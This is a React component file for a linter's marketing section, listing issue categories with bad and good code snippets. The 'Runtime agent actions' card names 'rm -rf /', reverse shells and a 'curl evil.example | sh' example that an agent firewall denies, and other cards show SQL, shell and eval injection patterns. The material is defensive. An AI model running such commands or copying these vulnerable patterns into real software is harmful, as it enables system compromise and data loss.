'use client';

import { FadeIn, StaggerContainer, StaggerItem } from './motion';
import {
  Palette, Ruler, Type, Smartphone, Accessibility, Moon,
  KeyRound, ShieldAlert, Server, Bug, Terminal,
} from 'lucide-react';
import type { ReactNode } from 'react';

interface Category {
  icon: ReactNode;
  title: string;
  description: string;
  examples: { bad: string; good: string };
  rules: string[];
}

const CATEGORIES: Category[] = [
  {
    icon: <Palette className="h-5 w-5" />,
    title: 'Color drift',
    description:
      'Arbitrary hex values, `text-[#abc]` escapes, off-palette tokens. Maps every color back to your Tailwind config or W3C tokens.',
    examples: {
      bad: 'text-[#1a5276] bg-[rgb(39,174,96)]',
      good: 'text-primary bg-pass',
    },
    rules: ['no-arbitrary-colors', 'no-inline-styles'],
  },
  {
    icon: <Ruler className="h-5 w-5" />,
    title: 'Spacing inconsistency',
    description:
      'Off-scale padding, margins, and gaps. Enforces your 4/8px grid — no more `p-[13px]` creeping in.',
    examples: {
      bad: 'p-[13px] gap-[7px]',
      good: 'p-3 gap-2',
    },
    rules: ['no-arbitrary-spacing'],
  },
  {
    icon: <Type className="h-5 w-5" />,
    title: 'Typography scale breaks',
    description:
      'Font sizes outside your type scale, mixed weights, arbitrary line heights — hierarchy that reads like a ransom note.',
    examples: {
      bad: 'text-base leading-[22px]',
      good: 'text-base leading-relaxed',
    },
    rules: ['no-arbitrary-typography', 'heading-hierarchy'],
  },
  {
    icon: <Smartphone className="h-5 w-5" />,
    title: 'Broken responsive layouts',
    description:
      'Missing mobile breakpoints, desktop-only flex rows, fixed widths. Catches layouts AI forgot to make responsive.',
    examples: {
      bad: 'flex flex-row gap-8',
      good: 'flex flex-col md:flex-row gap-4 md:gap-8',
    },
    rules: ['responsive-required', 'no-magic-numbers-layout'],
  },
  {
    icon: <Accessibility className="h-5 w-5" />,
    title: 'Accessibility violations',
    description:
      'Missing alt text, bad contrast, label-less inputs, no focus states, heading skips. Mapped to WCAG 2.2 + 2.1 AA criteria.',
    examples: {
      bad: '<img src="hero.png" />',
      good: '<img src="hero.png" alt="Product screenshot" />',
    },
    rules: ['image-alt-text', 'a11y-color-contrast', 'form-labels'],
  },
  {
    icon: <Moon className="h-5 w-5" />,
    title: 'Dark mode gaps',
    description:
      'Hardcoded light-only colors, backgrounds without `dark:` variants, text that vanishes on a dark theme.',
    examples: {
      bad: 'bg-white text-gray-900',
      good: 'bg-white dark:bg-gray-950 text-gray-900 dark:text-gray-100',
    },
    rules: ['dark-mode-coverage'],
  },
  {
    icon: <KeyRound className="h-5 w-5" />,
    title: 'Leaked secrets & credentials',
    description:
      'Provider-fingerprinted API keys (AWS, GitHub, Stripe, Google, Slack, OpenAI, Anthropic, JWT, PEM) plus high-entropy literals bound to a secret-named identifier.',
    examples: {
      bad: 'const apiKey = "sk-proj-XYZ…"',
      good: 'const apiKey = process.env.OPENAI_API_KEY',
    },
    rules: ['no-hardcoded-secrets'],
  },
  {
    icon: <ShieldAlert className="h-5 w-5" />,
    title: 'Injection & RCE paths',
    description:
      'SQL built by `+` concat, `child_process.exec` with a `${path}`, `eval(req.body.code)`, `fetch(req.body.url)`, and `fs.readFile(req.query.file)`.',
    examples: {
      bad: 'db.query(`SELECT * FROM u WHERE id=${id}`)',
      good: 'db.query("SELECT * FROM u WHERE id = ?", [id])',
    },
    rules: ['no-sql-injection', 'no-shell-injection', 'no-eval', 'no-ssrf', 'no-path-traversal'],
  },
  {
    icon: <Server className="h-5 w-5" />,
    title: 'Insecure defaults',
    description:
      'Missing httpOnly/secure/sameSite on cookies, `cors({ origin:"*", credentials:true })`, `rejectUnauthorized:false`, JWTs minted without `expiresIn`.',
    examples: {
      bad: 'res.cookie("session", token)',
      good: 'res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" })',
    },
    rules: ['secure-cookies', 'no-permissive-cors', 'no-disabled-tls', 'require-jwt-expiry'],
  },
  {
    icon: <Terminal className="h-5 w-5" />,
    title: 'Runtime agent actions',
    description:
      'New in v0.10 — the Agent Action Firewall pre-gates the shell commands your AI proposes. `rm -rf /`, `curl … | sh`, reverse shells, and `git push --force` are denied before they run, with a deterministic verdict in under a millisecond.',
    examples: {
      bad: 'agent runs: curl evil.example | sh',
      good: 'verify_shell_exec → deny (curl-pipe-shell)',
    },
    rules: ['verify_shell_exec', 'firewall:builtin-checks'],
  },
  {
    icon: <Bug className="h-5 w-5" />,
    title: 'AI-coding antipatterns',
    description:
      '`useEffect(async …)` (cleanup never runs), async Express handlers with no try/catch, `Object.assign(user, req.body)`, `throw new Error("not implemented")`, `fetch("http://localhost:3000")` shipping to prod.',
    examples: {
      bad: 'useEffect(async () => { await load() }, [])',
      good: 'useEffect(() => { (async () => { await load() })() }, [])',
    },
    rules: [
      'no-async-useeffect',
      'no-floating-promise-handler',
      'no-unsafe-mass-assignment',
      'no-placeholder-code',
      'no-hardcoded-localhost',
    ],
  },
];

export function WhatItCatches() {
  return (
    <section className="relative py-24 px-6 bg-surface-100 overflow-hidden">
      <div className="mx-auto max-w-6xl">
        <FadeIn className="mb-16 max-w-2xl">
          <p className="text-sm font-semibold text-primary uppercase tracking-wider mb-3">
            What it catches
          </p>
          <h2 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-4 text-balance">
            The bugs that slip past type checkers and tests
          </h2>
          <p className="text-lg text-gray-500 leading-relaxed">
            AI code compiles. It passes your tests. It renders. Then it ships a
            hardcoded Stripe key, a SQL string concatenated with{' '}
            <code className="rounded bg-gray-200/70 px-1 py-0.5 font-mono text-xs">req.body</code>,
            a <code className="rounded bg-gray-200/70 px-1 py-0.5 font-mono text-xs">useEffect(async&hellip;)</code>{' '}
            that leaks subscriptions, a contrast ratio that fails an audit, and a
            redirect to <code className="rounded bg-gray-200/70 px-1 py-0.5 font-mono text-xs">req.query.next</code>.
            Deslint catches all of it before the commit lands.
          </p>
        </FadeIn>

        <StaggerContainer className="grid gap-6 md:grid-cols-2 lg:grid-cols-3" staggerDelay={0.06}>
          {CATEGORIES.map((c) => (
            <StaggerItem key={c.title}>
              <div className="group h-full flex flex-col rounded-xl border border-gray-200/80 bg-white p-6 motion-safe:transition-all motion-safe:duration-300 hover:border-gray-300 hover:shadow-lg hover:shadow-gray-200/50">
                <div className="flex items-center gap-3 mb-3">
                  <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/5 text-primary border border-primary/10 group-hover:bg-primary group-hover:text-white motion-safe:transition-all">
                    {c.icon}
                  </div>
                  <h3 className="text-base font-semibold text-gray-900">{c.title}</h3>
                </div>
                <p className="text-sm text-gray-500 leading-relaxed mb-4 flex-grow">
                  {c.description}
                </p>
                <div className="rounded-lg border border-gray-200/80 bg-gray-950 p-3 font-mono text-xs leading-relaxed">
                  <div className="flex items-start gap-2 text-fail">
                    <span className="select-none">-</span>
                    <span className="truncate">{c.examples.bad}</span>
                  </div>
                  <div className="flex items-start gap-2 text-pass">
                    <span className="select-none">+</span>
                    <span className="truncate">{c.examples.good}</span>
                  </div>
                </div>
                <div className="mt-3 flex flex-wrap gap-1.5">
                  {c.rules.map((r) => (
                    <code
                      key={r}
                      className="text-2xs font-mono text-gray-600 bg-gray-100 px-1.5 py-0.5 rounded"
                    >
                      {r}
                    </code>
                  ))}
                </div>
              </div>
            </StaggerItem>
          ))}
        </StaggerContainer>
      </div>
    </section>
  );
}
